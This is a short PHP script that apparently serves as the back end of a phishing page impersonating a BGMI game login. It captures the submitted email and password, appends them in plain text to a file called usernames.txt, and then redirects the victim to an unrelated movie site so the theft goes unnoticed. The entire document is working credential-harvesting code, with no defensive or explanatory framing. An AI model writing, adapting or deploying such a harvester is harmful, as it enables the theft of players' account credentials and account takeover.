<?php

file_put_contents("usernames.txt", "BGMI Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://atozmovies.tech');
exit();
?>